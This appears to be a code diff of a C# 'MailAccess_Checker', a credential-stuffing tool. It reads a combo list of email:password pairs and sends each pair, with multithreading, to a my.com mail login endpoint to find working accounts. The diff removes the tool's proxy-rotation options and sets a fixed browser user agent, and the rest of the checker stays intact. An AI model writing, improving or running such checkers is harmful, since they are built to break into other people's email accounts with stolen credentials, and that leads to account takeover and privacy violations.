@@ -27,36 +27,6 @@ namespace MailAccess_Checker
             ComboLoad();
 
 
-            Utils.print("Select Proxylist", "");
-            ProxyLoad();
-
-            for (; ; )
-            {
-                Utils.print("Select Proxy Type", "\n");
-                Utils.print("1", "HTTP\n");
-                Utils.print("2", "SOCKS4\n");
-                Utils.print("3", "SOCKS5\n");
-                Utils.print(">", "");
-                var readProxy = System.Console.ReadLine();
-                switch (readProxy)
-                {
-                    case "1":
-                        proxyType = "HTTP";
-                        break;
-
-                    case "2":
-                        proxyType = "SOCKS4";
-                        break;
-
-                    case "3":
-                        proxyType = "SOCKS5";
-                        break;
-                    default:
-                        continue;
-                }
-                break;
-            }
-
             Utils.print("How many threads do you want to use", "\n");
             Utils.print(">", "");
             bool validInput = false;
@@ -159,23 +129,10 @@ namespace MailAccess_Checker
                         Interlocked.Increment(ref comboIndex);
                         totalChecked++;
 
-                        switch (proxyType)
-                        {
-                            case "HTTP":
-                                req.Proxy = HttpProxyClient.Parse(proxy);
-                                req.Proxy.ConnectTimeout = 5000;
-                                break;
-                            case "SOCKS4":
-                                req.Proxy = Socks4ProxyClient.Parse(proxy);
-                                req.Proxy.ConnectTimeout = 5000;
-                                break;
-                            case "SOCKS5":
-                                req.Proxy = Socks5ProxyClient.Parse(proxy);
-                                req.Proxy.ConnectTimeout = 5000;
-                                break;
-                        }
-
-                        req.UserAgent = Http.RandomUserAgent();
+                        req.UserAgent = Http.ChromeUserAgent();
+                        req.IgnoreProtocolErrors = true;
+                        req.AllowAutoRedirect = true;
+                        req.KeepAlive = true;
 
                         string request = req.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + array[0] + "&Password=" + array[1]).ToString();
 
@@ -217,34 +174,6 @@ namespace MailAccess_Checker
 
                 combos = new List<string>(File.ReadAllLines(fileName));
                 Combototal = combos.Count();
-                Console.Write("Selected ", Color.White);
-                Console.Write(Proxytotal, Color.Purple);
-                Console.Write(" Proxies\n\n", Color.White);
-            });
-            x.SetApartmentState(ApartmentState.STA);
-            x.Start();
-            x.Join();
-        }
-
-
-        public static void ProxyLoad()
-        {
-            string fileName;
-            var x = new Thread(() =>
-            {
-                var openFileDialog = new OpenFileDialog();
-                do
-                {
-                    openFileDialog.Title = "Select Proxy List";
-                    openFileDialog.DefaultExt = "txt";
-                    openFileDialog.Filter = "Text files|*.txt";
-                    openFileDialog.RestoreDirectory = true;
-                    openFileDialog.ShowDialog();
-                    fileName = openFileDialog.FileName;
-                } while (!File.Exists(fileName));
-
-                proxies = new List<string>(File.ReadAllLines(fileName));
-                Proxytotal = proxies.Count();
                 Console.Write("Selected ", Color.White);
                 Console.Write(Proxytotal, Color.Purple);
                 Console.Write(" Proxies\n\n", Color.White);
